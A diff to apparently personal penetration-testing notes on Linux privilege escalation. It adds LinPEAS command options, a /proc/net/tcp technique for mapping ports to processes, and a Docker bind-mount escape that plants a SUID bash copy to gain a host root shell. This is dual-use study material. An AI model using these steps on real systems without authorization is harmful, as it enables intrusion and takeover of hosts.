@@ -1,5 +1,26 @@
 # Linux Privilege Escalation
 
+### LinPEAS (common options)
+
+```bash
+# Full run with sudo password for checks that need it
+./linpeas.sh -a -e -r -P SUDO_PASSWORD -n -o system_information,container,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex
+
+# Same but without -a (no full mode); -o limits to these sections only
+./linpeas.sh -e -r -P SUDO_PASSWORD -o system_information,container,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex
+```
+
+| Flag | Meaning |
+|------|---------|
+| `-a` | All checks (slower) |
+| `-e` | Extra enumeration |
+| `-r` | Enable regex (can take a long time) |
+| `-P PASS` | Password for sudo (runs sudo checks) |
+| `-n` | Skip (no) network checks |
+| `-o section1,section2,...` | Only run these sections (e.g. skip cloud) |
+
+---
+
 ### Basic Manual Enumeration
 
 ![alt text](https://miro.medium.com/max/2400/0\*rOZTLGBULgHhS2p\_.png)
@@ -1791,6 +1812,41 @@ cat /proc/1/environ
 CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, 
 DAC_READ_SEARCH, DAC_OVERRIDE, CAP_SYS_RAWIO, 
 CAP_SYSLOG, CAP_NET_RAW, CAP_NET_ADMIN
+```
+
+**Map listening port to process (unprivileged):** When you see a port in `ss -ltn` or `netstat` but can't see which process (e.g. root-owned), use `/proc/net/tcp`. Port is in hex (fourth column, after the colon). Match the line to get the inode (last number). Then find the PID that has that socket inode:
+
+```bash
+# Port to hex (e.g. 37973 -> 9455)
+printf '%x\n' 37973
+
+# Find line for 127.0.0.1:9455 in /proc/net/tcp; note the inode (e.g. 5974)
+cat /proc/net/tcp | grep :9455
+
+# Find PID with that socket (root processes may not show in /proc/*/fd for non-root)
+for pid in /proc/[0-9]*; do
+  ls -l $pid/fd 2>/dev/null | grep -q 'socket:\[5974\]' && echo "PID: ${pid##*/}"
+done
+# Then: ps -fp PID
+```
+
+If the process is root-owned, `ls -l /proc/*/fd/*` may not show it; the loop still works when run by a user who can read other processes' fd info.
+
+**Docker escape via bind mount:** If the container has a bind mount from the host, you can write a SUID binary into the mounted path from inside the container; it appears on the host with the same bits.
+
+```bash
+# From inside the container: find host path mounted into container
+cat /proc/self/mountinfo | grep -v overlay
+# Look for a line like: 8:1 /opt/limesurvey /var/www/html/survey rw,relatime - ext4 /dev/root ...
+# So /var/www/html/survey in container = /opt/limesurvey on host
+
+# Create SUID shell in mounted path (inside container, as root or with sudo)
+cp /bin/bash /var/www/html/survey/bash
+chmod +s /var/www/html/survey/bash
+
+# On host (with shell as unprivileged user)
+/opt/limesurvey/bash -p
+# Results in root shell (-p preserves SUID).
 ```
 
 **Reference:** https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/
